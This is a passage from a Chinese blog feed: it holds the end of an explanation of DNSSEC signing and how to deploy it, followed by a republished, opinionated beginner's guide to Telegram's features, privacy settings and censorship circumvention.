的只签名，不加密主要是因为 DNSSEC 是 DNS 的一个子集，使用的是同一个端口，所以是为了兼容 DNS 而作出的东西，而 DNS 是不需要客户端与服务器建立连接的，只是客户端向服务器发一个请求，服务器再向客户端返回结果这么简单，所以 DNS 都可以使用 UDP 来传输，不需要 TCP 的握手，速度非常快。HTTPS 不是 HTTP 的子集，所以它使用的是另一个端口，为了做到加密，需要先与浏览器协商密钥，这之间进行了好几次的握手，延迟也上去了。 在哪里验证？ 刚才所讲述的所有情况，都是在没有 DNS 缓存服务器的情况下。如果有 DNS 缓存服务器呢？ 实际上，一些 DNS 缓存服务器就已经完成了 DNSSEC 验证，即使客户端不支持。在缓存服务器上验证失败，就直接不返回解析结果。在缓存服务器进行 DNSSEC 验证，几乎不会增加多少延迟。 但这也存在问题，如果缓存服务器到客户端之间的线路不安全呢？所以最安全的方法是在客户端上也进行一次验证，但这就会增加延迟了。 DNSSEC 的时效性和缓存 DNSSEC 相比 HTTPS 的一个特性就是 DNSSEC 是可以被缓存的，而且即使是缓存了也能验证信息的真实性，任何中间人也无法篡改。然而，既然能够缓存，就应该规定一个缓存的时长，并且这个时长也是无法篡改的。 签名是有时效性的，这样客户端才能够知道自己获得到的是最新的记录，而不是以前的记录。假如没有时效性，你的域名解析到的 IP 从 A 换到了 B，在更换之前任何人都可以轻易拿到 A 的签名。攻击者可以将 A 的签名保存下来，当你更换了 IP 后，攻击者可以继续篡改响应的 IP 为 A，并继续使用原本 A 的签名，客户端也不会察觉，这并不是所期望的。 然而在实际的 RRSIG 签名中，会包含一个时间戳（并非 UNIX 时间戳，而是一个便于阅读的时间戳），比如 20170215044626，就代表着 UTC 2017-02-15 04:46:26，这个时间戳是指这个记录的失效时间，这意味着在这个时间之后，这个签名就是无效的了。时间戳会被加进加密内容中去参与签名的计算，这样攻击者就无法更改这个时间戳。由于时间戳的存在，就限制了一个 DNS 响应可以被缓存的时长（时长就是失效时间戳减去当前时间戳）。然而，在有 DNSSEC 之前，控制缓存时长是由 TTL 决定的，所以为了确保兼容性，这两个时长应该是完全一样的。 通过这样做，即能够兼容现有的 DNS 协议，有能够保证安全，还能够利用缓存资源加快客户端的请求速度，是一个比较完美的解决方案。 DNSSEC 的实际部署 其实，即使完全不了解，或者没看懂上面的内容，也不影响你去部署 DNSSEC，只不过你应当非常仔细的对待它，稍有不慎可能导致用户无法解析的情况。 使用第三方 DNS（Managed DNS）部署 DNSSEC 由于是使用第三方的 DNS，部署 DNSSEC 就必须需要第三方支持。常见的支持 DNSSEC 的第三方 DNS 有 Cloudflare、Rage4、Google Cloud DNS（需要申请）、DynDNS 等。开启 DNSSEC 前首先需要在第三方服务上激活 DNSSEC，这样第三方 DNS 才会返回关于 DNSSEC 的记录。 在第三方的 DNS 上激活了 DNSSEC 之后，第三方会给你一个 DS 记录，大概长这样： tlo.xyz. 3600 IN DS 2371 13 2 913f95fd6716594b19e68352d6a76002fdfa595bb6df5caae7e671ee028ef346 此时，你就需要前往域名注册商，给你的域名提供这个 DS 记录（有些域名注册商可能不支持添加 DS 记录，此时你可以考虑转移到本站的域名注册商或者其他支持 DS 记录的注册商。此外，一些域名后缀也不支持添加 DS 记录，建议你使用主流后缀，如 .com 等，此处就以本站的域名注册商为例）： 添加然后保存，一切就 OK 了。注意关键标签（Key Tag）就是 DS 记录里的第一项（此处对应的是 2371），算法（Algorithm）就是第二项（此处对应的是 13），算法类型（Digest Type）就是第三项（此处对应的是 2），整理分类（Digest）就是最后一项。剩下的内容不需要填写。 有的第三方 DNS（比如 Rage4）会给你一下子提供多个 DS 记录（相同的关键标签但是不同的算法和算法类型），然而你不需要都填写上。我建议只填写使用算法 13 与类型 2 或者算法 8 类型与类型 2 的 DS。这两个分别是 Cloudflare 推荐的参数和根域名目前所使用的参数。填写多个 DS 记录不会给你带来多少的安全性提升，但可能会增大客户端的计算量。 使用自建 DNS 部署 DNSSEC 使用自建 DNS 首先需要先生成一对密钥对，然后将其添加到 DNS 服务中去。我已经介绍了关于 PowerDNS 的添加 DNSSEC 的方法。 在此之后，你需要生成 DS 记录，通常你生成 DS 记录也是很多个，和第三方 DNS 一样，我建议只向域名注册商提交使用算法 13 与类型 2 或者算法 8 类型与类型 2 的 DS。 参考资料 Economical With The Truth: Making DNSSEC Answers Cheap RFC 5155 – DNS Security (DNSSEC) Hashed Authenticated Denial of Existence ","link":"https://blog.gd1214b.icu/post/H5XieIE3d/"},{"title":"Telegram：新手指南、使用教程及频道推荐（持续更新中）","content":" 本文转自：https://tingtalk.me/telegram/ 电报是迄今为止最棒的即时聊天软件，在这个自由新世界，不必自我审查（Freedom of speech）。 🧱 TG 在中国大陆必须 翻墙 后才能使用。不过，学会科学上网，难道不是当代数字公民的必备技能吗？ 📁 tingtalk.me 在 2020-04-04 被墙了，如需在墙内传阅，请下载本文的 PDF 或前往 GitHub 阅读（也是可编辑的 Markdown 源文档）。 💡 全文有两万三千多字，善用右侧的目录栏和查找功能（Ctrl + F），助你快速定位想要看到的内容。你也可以移步到 电报内阅读此文的精简版。 ✈️ 电报介绍 2013 年 5 月 20 日，斯诺登向《卫报》媒体透露棱镜计划（PRISM）： 我愿意牺牲掉这一切（工作、收入和女朋友）（把真相告诉世人），因为美国政府利用他们正在秘密建造的这一个庞大监视机器摧毁隐私、互联网自由和世界各地人们的基本自由的行为让他良心不安。by Edward Snowden 许多人第一次意识到 Ta 们的数字通信遭到了监视（The year Telegram was born was marked by the Snowden Revelations, when many people realized for the first time their digital communications were being watched.）。 2013 年 8 月 14 日，杜洛夫兄弟（Pavel Durov 和 Nikolai Durov）正式发布了开源（Open Source）的 Telegram（特指客户端）。这个充满理想主义的软件不接受外部投资（不需要向任何股东负责），也不会通过广告盈利，且挣钱永远不会是 Telegram 的终极目标（Making profits will never be an end-goal for Telegram），所以 Telegram 至今没有向第三方披露过一个字节的用户私人数据。Telegram 只会默默地践行一个理念：这个星球上的每个人都享有自由的权利（Everyone on the planet has a right to be free.）。This is the Telegram way： We believe that humans are inherently intelligent and benevolent beings that deserve to be trusted; trusted with freedom to share their thoughts, freedom to communicate privately, freedom to create tools. This philosophy defines everything we do. 我们相信人类天生就是聪明和仁慈的，值得信任的；坚信人类可以自由地分享想法，自由地私下交流，自由地创造工具。 这种哲学定义了我们所做的一切。by Pavel Durov 截止 2020 年 12 月 23 日，Telegram 已有 5 亿月活跃用户。 👍 近乎完美 高度加密：使用独有的网络传输协议 MTProto，无惧被黑客攻击。 没有审查：不用担心被封号，除非执法调查单位能证明用户是恐怖分子。 没有广告：一个纯碎极致的大众化即时通讯软件（Instant Messaging App）。 不占内存：聊天记录保存在云端（Cloud-Based），任何设备，无缝同步，随取随用。 超大群聊：封顶 20 万人，配合各种管理工具（例如限制发言间隔），让大型社群的交流也能井井有条。 表情贴纸：采用 矢量 格式，高清而富有趣味；并且支持自制表情包（Custom Sticker Sets）。 👎 瑕不掩瑜 欢迎访问 Feature Suggestion Platform，向 Telegram 提交缺陷报告和功能建议（Bugs and Suggestions），一起帮扶 Telegram 做大做强。 🐼 中文搜索体验差 毕竟是国外的软件，所以有一些水土不服也是可以理解的。以下方法可以助你更快地找到聊天记录和频道信息。 方法一：手动分词 Telegram 的中文搜索是以「词组」为单位的，以标点符号或空格作为词的间隔。 辜鸿铭说过：真正的自由，并不意味着可以随心所欲，而是可以自由地做正确的事情。 在搜索框输入： 真正的自由 并不意味着可以随心所欲 而是可以自由地做正确的事情 都可搜到这条历史信息，因为标点符号充当了分词符。但是这些词未免太长了吧？！也记不住呀。不过别忘了 Telegram 分词规则，我们可以手动添加多余的标点符号（例如井号 ＃）或空格来分词： #辜鸿铭 说过：真正的 #自由，并不意味着可以随心所欲，而是可以自由地做正确的事情。 点击以下词组，或者在搜索框输入： #辜鸿铭 #自由 都可以找到这句话。建议频道主在发布内容的时候，用 # 打上相应的标签，方便订阅者找到想要的信息。 方法二：导出文件 嫌手动分词太麻烦了？那就在电脑上导出 HTML 或 JSON 格式的聊天记录，想怎么搜就怎么搜。 不过，已经有人向 Telegram 提交了 改善中文搜索的提案，所以请为这个 Suggestion 投票和鼓气。拜托了。 关联阅读 为什么 Telegram 不能搜索中文讯息 - 翁君牧 Telegram 中文搜索方案探索 - Newlearner 🙃 硬币的另一面 在加密通信「庇护」下的土壤，滋生了臭名昭著的网络性犯罪案件：N 号房事件。所幸的是，2020 年 11 月 26 日，主犯赵主彬一审判处监禁 40 年。 以及存在大量的 NSFW 内容、币圈广告和灰色产业链。科技能否向善，在于我们能否约束自己内心的 邪念。 📱 只能用手机号码注册 国外：手机号不用实名制，相对安全。 国内：通过 Google Voice 注册电报，并且可以绕开私聊限制。 而且，添加陌生人到通讯录（Add to contacts），记得每次都要取消勾选 Share my phone number with ***。Telegram 在这个方面上没有记住用户习惯，不应该呀，我去反馈反馈。 另外，如果你的手机号码，被某人保存在 Ta 的手机通讯录，Ta 也开放了通讯录给 Telegram。当你用这个手机号码注册 Telegram 后，Ta 就会第一时间知道你也加入 Telegam 了。所以对隐私有要求，请使用无需实名的虚拟号码或者单独小号来注册。 🗓️ 逃离微信 我与 Telegram 的结缘，始于 2016 年春。那时我刚学会了科学上网，并下载了 Telegram 这个 Instant Messaging app。虽然我在电报上找不到朋友和我聊天，但我并没有卸载 Telegram，因为相比输入法和微信，Telegram 提供了丰富的 Emoji 供我选择。如此一来，我在 Android 手机上也能使用最新的 Emoji 点缀朋友圈。 近年来，天下苦微信久矣。 WeChat 掌门人可能是一个无马（码）不欢的 骑兵：每次登录微信电脑版都要扫码时，我的心中都会万马奔腾。 只能发送小于 100 MB 的文件；一次只能发送 9 张图片，而且每次发送都要勾选原图（Telegram 会记住这个用户习惯）。 占用巨大的存储空间，备份与同步的体验特别差，也不能换成欧盟号码导出用户数据。 注册微信的时候，用户会默认同意 腾讯微信软件许可及服务协议 ，其中在 7.1.2 提到一个霸王条款：「微信帐号的所有权归腾讯公司所有，用户完成申请注册手续后，仅获得微信帐号的使用权，且该使用权仅属于初始申请注册人。……」。 用户免费使用微信（无所有权），微信收集用户的私人数据，贩卖给广告商，这无可厚非。但当用户想要取回 Ta 所创造的内容（数字资产）时，例如导出微信个人数据（朋友圈数据和收藏功能数据等），只好借助欧盟的 GDPR（通用数据保护条例）行使数据可携权。于是我花了 5.26 USD（含税）买了一个比利时的手机号码，微信却猖言道：「由于当地法规限制，WeChat 暂不支援中国大陆用户将绑定的手机号码更换为欧盟手机号码。」 请问是哪条「当地法规」？这不是「法制」，而是「Fuck 制」：强奸一个个没有反抗能力的用户！2020-04-22 原谅我「口吐芬芳」，不懂中国特色。另外，随着言论审查力度的加大，任何「风吹草动」都要「斩草除根」： Cyberspace Administration of China（网信办）会因为我转发一则关于 中华人民共和国宪法修正案 的 Twitter 评论到 24 人的微信同学群，几小时后，请我到最近的派出所「喝茶」，那是我第一次坐警车。 微信上无法发送某些链接（例如纽约时报的文章），也不显示发送失败，让你以为发出去了，其实只对你可见。 微信会秋后算账，删除我之前写的一篇介绍 搜索技巧 的公众号文章，接着 博客 在中国大陆地区被墙，公众号 被永久封号。虽然公众号写了 4 年只有五百多个关注者，但每一个订阅者都来之不易。就这样，我跟读者们都失联了。 经过一系列发生我身上的 屏蔽事件 后，让我意识到中文互联网已经完全沦陷了，于是逃难到 Telegram。经过一段时间的使用后，我彻底成为了 Telegram 的 自来水，见人就夸。然而身边的亲朋好友却不为所动，不愿跟我一起 数字移民 到这个可以安心说话的地方，甘愿做「温室里的花朵」和「笼的传人」，享受表面上的岁月静好。我不会责怪 Ta 们，如果你看过《肖申克的救赎》，就能理解这种「放弃抗争」的心态。 刚入狱的时候，你痛恨周围的高墙，慢慢地，你习惯了生活在其中，最终你发现，自己不得不依靠它而生存。by The Shawshank Redemption 既然说不动认识我的人，但世界那么大，人口那么多，网络世界上一定有一群人，Ta 们和我一样，反感「温室园丁」不透明的做法，不愿做一只数字农场里的电子绵羊，相信「自由价更高」。 我要当一个 踹车轮 的人，为我心中的理想世界投票。因此我熬了几个月，把 Telegram 官网的 FAQ 和 Blog 全部看完了（从 2013 年创立电报至今），结合 Google 搜索引擎旁征博引，整理出这篇可能是中文互联网内容最翔实，排版最精美的《电报指南》，目的就是尽可能地为读者呈现 Telegram 的强大、私密以及友好的用户体验。 在 Durov's Chat 用蹩脚的中式英语给教程做推广，受到 Pavel 的肯定。 2016 年国庆，我花了一周时间看完了「即刻 app」的所有主题（圈子），写了一篇三千多字文章：《即刻 App - 不再错过你感兴趣的资讯》(图文版 | 文字版）。即刻已经没有复活的可能了（即刻 App 居然在 2020 年 6 月 10 日回来了，但是缺失了话题追踪功能），Telegram 顺势成了新的资讯中心。 人生苦短，逃离微信（Escape from the WeChat）。stay-away-from-wechat 项目收集微信的反人性设计、无理审查行为、侵犯用户隐私、监控聊天记录、试图控制人民生活相关信息，期望用户认识到微信的弊病，倡导用户用脚投票、拒绝使用微信 👎️。欢迎提交 Issues 和 Pull requests 🤖️。 欢迎读者们转移到没有监控和审查的地方 ，一起在这片乐土上过上没羞没臊体面的数字生活。 🌟 注册使用 接下来，就正式进入主题，教读者朋友们电报怎么使用。 👇 下载登录 请进入 Telegram Apps 的官方下载页面，选择对应的平台，下载，安装，注册。 自由开放的 Telegram 在各平台都有数十种客户端，各有哪些优缺点，又该如何选择呢？请查阅 Telegram 客户端版本比较，但我不推荐使用第三方电报客户端，安全没有保证。 如果你有注册或登录问题 先从 常见登录问题 中寻找方法，无果，联系 Telegram： 途径一：请使用此 表格 与 Telegram 联系。 途径二：在 Twitter 上联系 Telegram Login Help（@smstelegram） 如何在电脑上使用 Telegram for Desktop 打开客户端 点击右上角的 SETTINGS（设置）&gt; Connection type（连接类型）&gt; Use custom proxy（使用自定义代理）&gt; ADD PROXY（添加代理），以 Shadowsocks(R) 为例： SOCKS Hostname: 127.0.0.1 Port: 1080（不同的翻墙客户端，端口略有不同） 使用 Clash 翻墙的用户，可跳过这一步，选择 Use system proxy settings（使用系统代理设置）。 🐼 汉化界面 既然已经出来混了（突破网络墙），首选使用英文版的 Telegram（突破语言墙），好像加起来也没几个单词。要是一点英文底子都没有： 点此安装官方简体中文语言包 选择 CHANGE（更改） 即可把界面语言替换为简体中文 截至 2020 年 11 月 01 日，Telegram for Android 翻译已完成 95% 了，但不妨碍日常使用。 🔒 账号设置 支持视频头像（Profile Videos）。 支持登录多个账号。手机端长按另一个账号，不切换账号，也能快速预览消息。Multiple accounts: preview chat list. You can press and hold on another connected account in Settings for a sneak peek of its chats list. 👤 设置用户名 你可以在 Setting（设置）里面填写一个 Username（用户名）。设置后，别人能够在不知道你的电话号码的情况下，通过搜索用户名找到你。 用户名可以随时更改或删除（用户名为空）。 用户名不区分大小写（TingTalk = tingtalk），但 Telegram 会记住大小写偏好。 侵权 如果一个骗子假装是你，联系 @notoscam。 如何举报假冒的频道或群组：点击右上角的 ... &gt; Report &gt; Fake Account 针对品牌方，用户名被占用怎么办？把你在 Facebook、Twitter 或 Instagram 的用户名（两个平台以上）发给 @username_bot。 如果你看到表情包（sticker sets）、频道（channels）或机器人（bots）侵犯了你的版权，请提交投诉到 dmca@telegram.org 联系人 添加和删除联系人（Contacts）都是单向操作，双方的通讯录都是独立的（你中有我，我中可能没有你），也没有通知。 （单向）添加联系人之后，加入共同小组后，通讯录好友会排在小组名单前面。如果你想加入一些不想让别人知道的群组，还是用小号吧。 点击左侧菜单栏 &gt; Contacts（联系人）&gt; Find People Nearby（寻找附近的人）。你也可以创建一个基于本地的群聊。 🔓 解除私聊限制 自由的土壤吸引了比特币、社工库、NSFW 等灰色产业到电报野蛮生长，因为这些国产老鼠屎对电报的滥用，导致使用中国大陆的手机号码（+86）注册 Telegram 后，私聊 Ta 人时，可能会提示 Sorry, you can only send messages to mutual contacts at the momet.（对不起，你现在只能发送私信给双向联系人。），这表明此账号被判定为 Spam（垃圾信息）账号了。 如何解除私聊限制：在 Telegram 搜索 @SpamBot，点击 START，然后依次点击底部出现的菜单或回复以下话术（仅供参考）： But I can't message non-contacts. No, I'll never do any of this. I can't chat with non-contacts. Accident. 大概半小时之后（有些人要十几天），即可解除禁言。 另外，若用户在 24 小时内访问超过 200 个群组或频道的链接（点击打开就算访问，不需要加入），就会被打入冷宫 24 小时。禁闭期间，无法通过链接访问新的群组或频道（点击链接一直转圈而无法访问）。 ⛑️ 隐私和安全 依次点击 Setting（设置）&gt; Privacy and Security（隐私和安全） 🙈 隐藏手机号码 Phone number（手机号码）&gt; Who can see my phone number（谁可以看到我的手机号码：Nobody 不允许任何人） 对隐私有要求，或者彻底解除 +86 开头的手机号码的私聊限制，可以把手机号码换绑到非中国区的手机号码，例如 Google Voice： 注册 Google 账号。 在 Google 或淘宝上搜索关键词 Google Voice 或 GV ，购买别人注册下来的号码。 转移到自己的 Google 账号上。 以及 🧨 再次强调：添加陌生人到通讯录（Add to contacts），记得每次都要取消勾选 Share my phone number with ***。 开启 SIM 卡的密码，纵使别人捡到你的手机（卡），没有 PIN 码就不能使用你的手机号码，也就不能收到登录验证码，以此来登录 Telegram。 🎭 匿名转发 Forwarded messages: Nobody（引用转发来源：不允许任何人） 启用此设置后，转发你的消息将无法指向（链接）回你的帐户，只会在 From ***（来自***）字段中显示一个无法点击的昵称（非用户名）。而昵称不是唯一的，所以通过这种方式，将没有证据证明某条消息是你发送的（无法溯源）。 📍 隐藏通话 IP 地址 Calls &gt; Peer-to-Peer：Nobody Telegram 为了提高语音通话的质量，默认采用端对端连接（Peer-to-Peer）。由于流量没有经过 Telegram 服务器中转，所以会暴露用户的 IP 地址。但是禁用端对端通话后，通话质量会略有下降。 另外，配合使用 Tor（The Onion Router、洋葱路由器）可以隐藏用户真实 IP 地址、避免网络监控及流量分析。 🔐 本机锁定码 Passcode Lock 相当于给 Telegram 加上应用锁。这样一来，临时借用你设备的人也看不到你的小秘密。 设置完密码锁之后，可以在下方的自动锁（Auto-lock）设定时长，一旦超过时长未操作，那么 Telegram 将自动上锁。或者在聊天列表页面上主动点击锁头图标，Telegram 就会立即锁定应用，新消息通知将不包括文本或发件人姓名。再次进入应用时，要求输入锁定码。 在 Android 客户端上，还可以关闭「在任务切换页面显示内容」（Show App Content in Task Switcher），同时在 Telegram 内也无法截屏。 密码锁只在当前设备可用，不会同步到云端或其他设备，所以在不同的设备上可以设置不同的密码锁。如果忘记，只能重装 App，而且重新登录之后，需要重新设置新的密码锁，私密聊天（Secret Chat）也不会同步回来。 ✌️ 两步验证 Two-step verification（两步验证：添加密码提示和 ❗️ 安全邮箱 ❗️） 以后登录时，输入验证码后，还要输入密码。 安全密码：请勿使用纯数字密码，可使用开源的 KeePass 生成高强度密码。 电子邮箱：忘记密码，可以通过 Email 找回密码。尽量选择国外邮箱服务，例如 Gmail 或者 Outlook 💥 删除账户 Delete my account if away for 1 month/3 months/6 months/1 year （删除我的帐户若离线时间达 1 个月 / 3 个月 / 6 个月 / 1 年） 自动删除：以上就是电报自带账户自毁机制（Account Self-Destruction） 主动删除：不想使用此账号，可 永久删除账户（Delete Account） 为什么要给账户设置自毁机制 Telegram 作为一个免费的非商业软件，没有任何收入来源，为了节约服务器的存储空间，Telegram 会自动删除长时间不上线的用户。再说了，Telegram 也不需要你的私人数据。 如果不慎丢失了 SIM（手机卡），此前未开启 SIM 卡的 PIN 码（强烈建议开启）和 Telegram 账户的两步验证，新的「主人」就能把你的 Telegram 账号占为己有。但是假如你设置了 1 个月不上线就销户，坏人在第 32 天捡到你的手机，不过此时你的 Telegram 账号已经不存在了。 🛡️ 其它隐私设置 使用没有个人特征的头像（记得在个人资料里删除历史头像）、昵称和用户名，确保硅基身份不会和碳基身份产生关联。 不使用 Touch ID 或 Face ID 解锁你的手机，只以密码锁屏（数字 + 字母），以免被「执法人员」控制身体后强行解锁。 💬 对话界面 Telegram 有一个非常人性化的特性：记忆浏览进度，打开对话界面会自动跳转到未读消息 Unread Messages（The app restores your previous scroll position when you switch back to a chat）或者上次的未读位置。纵使重新安装 Telegram，没看完的消息，状态依旧是未读的。 ✏️ 消息发送前 打上句号之前，检查一遍内容是否有误，虽然 Telegram 支持无限期的（撤回）修改。 ↩️ 引用消息 手机 左滑（Swipe left）Reply 消息。 长按，在弹出的界面中选择 Reply。 电脑 左键双击消息的空白处，例如在时间附近。 左键单击对话框的右上角的 Reply。 右击消息，在弹出的菜单中选择 Reply。 点击引用的消息，就会向上滚动到原始消息（If you tap on the quote, the app scrolls up to the original message）。 假设从 Unread Messages 开始浏览动态（已发布 120 条 Post），遇到新消息引用了旧消息，例如庭说频道的第 100 条消息 https://t.me/tingtalk/100 引用第 56 条消息 https://t.me/tingtalk/56，点击引用的消息，即可定位到第 56 条消息。如何回到第 100 条消息，点击右下角的 🔽 就会回到第 100 条消息，而不是回到最新的消息（shows an arrow button to go back to the previous location. This makes navigating conversations in groups easy even if you've been away for a while）。这是一个非常动人的细节，深深地被 Telegram 折服。 电脑右击 / 手机点按被引用消息（右下角有个 ↶），在弹出的菜单里选择 View * Reply，就能展开所有对此话题的讨论（回复）。 📝 文本格式化 学会插入超文本链接，避免冗长的 URL 霸屏（简短的网址例外），是一种网络美德。 全平台适用 采用有限的几种 Markdown 语法，例如： 加粗（前后加入两个星号）：**bold** 删除线（前后加入两个波浪号）：~~strikethrough~~ 等宽字体（前后加入一个重音符）：`monospace` 斜体（前后加入两个下划线）：__italic__（原生 Markdown 语法是前后一个星号） Desktop（桌面电脑端） 在编辑区输入文本。 左键选择想要格式化的文本。 右击 &gt; Formatting（格式选项）。 Formatting Shortcut for Windows Bold（加粗 ） Ctrl + B Italic（斜体） Ctrl + I Underline（下划线） Ctrl + U Strikethrough（删除线） Ctrl + Shift + X Monospace（等宽字体） Ctrl + Shift + M Create link（超链接） Ctrl + K Plain text（纯文本） Ctrl + Shift + N 重磅推荐 Ctrl + K！简单几步，让排版清清爽爽。 Android（安卓） 在编辑区输入文本。 长按选择想要格式化的文本。 原生 Android 系统会直接弹出格式化选项；魔改安卓系统（例如 MIUI）需要轻触界面右上角的三个点（在顶栏右侧，大概在通知栏电量 🔋 的下方。非常刁钻的一个位置），才能看到文本格式化选项。 iOS（iPhone &amp; iPad） 在编辑区输入文本。 长按选择想要格式化的文本，会弹出一些文字操作的选项。 轻触 BIU（或许藏在 ▶️ 后面），即可看到文本格式化选项。 如果觉得以上格式化文本的方法太麻烦，打乱了输入节奏，可在任意聊天框输入 @bold，接着使用 Markdown 编辑消息（最多输入 256 字符），最后选择 Custom markdown。 #️⃣ 主题标签 任何以 # 开头的词组，以标点符号或空格结尾的词组（hashtags）都可以被点击搜索，也相当于用标签给消息分组。 康德说过：#自由 不是让你想做什么就做什么，自由是教你不想做什么，就可以不做什么。 消息发出后，#自由 就会变成一个可点击搜索的状态。 🌅 发送原图 先选择想要发送的图片（不止于 9 张）： Android：点击弹出窗口右上角的三个点，Send without compression iOS、macOS 和 Windows：Send as a file 请注意： 原图不会压缩图片，但是会暴露文件名、隐藏的 GPS 信息和拍摄信息，慎重发送。 Telegram 会记住你的操作习惯，下次发送图片时不必再次勾选原图选项。 🎬 发送视频 支持时间戳（Timestamp）：发送本地视频或 YouTube 视频时，在 Add a caption（添加标题）里标记你最喜欢的时刻（mark your favorite moments），例如： 建议直接跳到 05:06 开始欣赏，有惊喜。 05:06 会自动高亮显示，点击 05:06，视频就会从第 5 分 6 秒播放。其中 05:06 必填项，提示的话可以选填。 引用回复本地视频或 YouTube 视频也支持加入时间戳（Timestamps in replies and captions open videos and YouTube links to that exact moment.）。 你发现了吗？YouTube 和哔哩哔哩的评论区也是支持这种时间戳。 不支持时间戳的软件和网页，怎么办 YouTube：https://www.youtube.com/watch?v=SyM3jMFjess&amp;t=05m06s 右键点击进度条 在弹出的菜单中选择 复制当前时间的视频网址 哔哩哔哩：https://www.bilibili.com/video/av55857100?t=14m15s 不支持复制当前时间的视频网址，需要手动填写 参数说明 ?t= / &amp;t= 时间 time h 时 hour m 分 minute s 秒 second 发送视频时，可选择压缩等级。Change the resolution of a video from the editor’s quality slider. 内置视频播放器（in-app media player）： 直接在 app 内观看 YouTube 或 Vimeo 视频，不必跳转到浏览器或者相应的视频 app。操作逻辑与国外视频 App 保持一致：双击左侧快退，双击右侧快进。 制作 GIF 动图 在发送视频时，点击视频打开编辑窗口，使其静音（tap the mute audio button），新的 GIF 就诞生了，还会自动保存在最近使用的 GIF 里（recent GIFs tab）。 📡 消息发送时 手机上长按（电脑上右击）消息发送键： Send without sound（静音发送）：纵使对方在睡觉，你的 urgent idea 也不会搅人春梦，简直就是为健忘的人而设计。 Scheduled Message（定时发送） 发送日程消息时，对方是不知道你使用了定时发送。 在 Saved Messages（我的收藏）也可以发送定时消息作为提醒（Set a reminder）。 Send when * comes online（当对方上线时发送）：这样就可以排在对方聊天列表的前面（Put you right at the top of their chat list.）。此功能需要对方在隐私设置里开启展示最后上线时间（This option only appears for users who share their Last Seen status with you, and vice versa.） 接收者可屏蔽联系人 / 群组 / 频道的消息通知（Mute Notifications）： 1 个小时 4 个小时 18 个小时 3 天 永久静音 🔙 消息发送后 点击消息，选择 Pin，即可在频道、群组或私聊界面中置顶多个消息（Multiple Pinned Messages）。在群组中置顶消息时，可强制通知全员（notify all members），即使成员的群组已经设置为静音。 ✔️ 消息状态 消息的读取状态（回执）分为两种 One check（✔️）：发送成功。在微信，有些消息没发送出去，只对你可见，也不会有发送失败的感叹号 ❗。这是对用户赤裸裸的欺骗 。 Two checks（✔️✔️）：消息已阅。瞥见状态栏弹出来的消息，不会产生已读标记。因此，一直显示单勾，不代表对方没看到信息。 一个偷看消息的小技巧：在对话列表，长按头像可预览消息，但消息状态不会变为已读。（Pull up a preview of messages – without making messages as read. ） ✏️ 消息更正 在 Telegram，说出去的话不会像泼出去的水收不回来，在 48 小时内（频道和群组是无限期修改），你都可以重新编辑（Edit your messages after posting），包括文字、图片和视频（Edit sent media to re-crop, re-decorate or completely replace photos and videos.），所以： 文字出现 typos，不用删除，多久之前发的消息都能随时更正（Edit）。 图片忘记打马赛克，但因为有图片说明（配文），懒得撤回重输，可以当场抹除敏感信息，当场换图片（Replace Media）。 视频发错了，善后方式与图片同理。 图片换视频，视频换图片，Why not? 如何替换图片或视频？长按或右击消息，选择 Edit： 通用法：点击笔头图标 ✏️（或 Replace file/photo），弹出资源窗口，选择正确的图片和视频即可替换。 桌面端：复制正确的图片和视频，回到 Telegram，粘贴即可替换。 并且支持直接标记别人发来的图片，修改完再发出去，无需保存在本地图库。Instantly edit and send back media you receive to add notations or decorations without saving it to your gallery. 在电脑端，把鼠标放在 edited 上，会显示最后修改消息的时间。 👇 长按消息 消息可以无限期撤回（Delete Messages）：删除信息时，勾选 Also delete for ***，聊天记录就可以双向删除。通话记录也支持这个特性（Call history can also be deleted for all sides at any time.）。电报服务器更不会存储被删除的聊天记录和通话记录，因此数据将彻底永远消失。 选择部分消息（Select Parts of Messages）：长按 2 次消息，可选择部分文字，而不是复制全文（Copy Selected Text）。 长按网址可以选择打开（Open）或者复制（Copy）。 转发消息时，长按联系人 / 群组 / 频道可多选。 🗣 朗读消息 Announce Messages 目前由 iOS 用户独占。你可以让 Siri 在你的耳机里大声读出你收到的信息，即使是在洗碗的时候也可以保持聊天的最新状态。 开启路径：iOS Settings &gt; Notifications &gt; Announce Messages。 ⏳ 自动删除 自动删除只适用于定时器设置后发送的消息，以前的消息将保留在聊天记录中。 倒计时在消息发送时开始计时；而秘密聊天是阅后即焚，是从已读后开始计时。 🗣️ 语音消息 支持 2 倍速播放（2X playback）。 支持滑动进度条。（Slide forward and back on voice messages to skip ahead or repeat something you missed.） 记忆播放位置：超过 20 分钟的音频文件（2021 年 3 月 18 日取消此限制），Telegram 会帮你记住最后的播放位置，以便中断后再次收听（Telegram apps will remember your last position when resuming playback of audio files longer than 20 minutes.）。 此外，在 Telegram 上进行语音通话（打电话），需要在翻墙服务端/客户端开启 UDP 转发。 📲 视频通话 发起视频通话和音频通话后，如果屏幕上的 4 个 Emoji 一致，表示此连接已采用端到端加密，100% 安全。 Video Calls: All voice and video calls are protected with end-to-end encryption. To confirm your connection, compare the four emoji shown on screen. If they match with your partner’s, your call is 100% secure. 🙈 生动表情 Emoji（绘文字） 按关键字搜索表情（Search emoji by keyword）：在消息框输入关键词，就会弹出相关的 Emoji。 能触发 Emoji 的英文关键词合集 能触发 Emoji 的简体中文关键词合集 部分 Emoji 支持动态播放（Animated Emoji） 在任意聊天窗口发送 1 个 非礼勿视猿 🙈（See-No-Evil Monkey），再动 Ta 试试，可爱吧！查看更多被 Telegram 赋予「生命」的动态 Emoji，请参阅 Telegram Animated Emoji List。 以下表情符号可以作为打赌小游戏（Emoji Game） 发送单个 触发效果 🎲 掷骰子 dice 🎯 扔飞镖 darts 🏀 投篮 basketball ⚽ 射门 football 🎳 保龄球 bowling 🎰 老虎机 jackpot / slot machine 如何在句中（mid-message）快捷添加 Emoji？ 语法是 :（英文半角冒号） + 关键词。例如输入 I am :happy，就会弹出开心相关的 Emoji，这样就不用从 Emoji 面板挑选 Emoji 了。 Stickers（表情包） 截至 2021 年 1 月 13 日，Telegram 上已有 20,000+ 免费的高清表情包。 在聊天窗口输入 @sticker + Emoji，可以检索所有与 Emoji 相关表情包，例如 @sticker 👍。 在哪里找表情包 网站： Stickers Cloud tlgrm：只支持用英文关键词搜索 群组：Stickers Cloud 频道：Trending Stickers 官方： 打开 Telegram 的一个对话界面，输入框选择 Sticker（旁边是选择 Emoji 和 GIF） 往下拉，即可在顶部看到 Search sticker sets（只支持用英文关键词搜索） 📤 如何导出电报上的表情包 选择一个 Sticker to GIF Converter，例如 @tgstogifbot 或 @Sticker2GIFBot（后一个 Bot 可下载整套表情包） 发送 Stickers，Bots 就会把 Telegram 上 tgs 格式的表情包转换为 gif 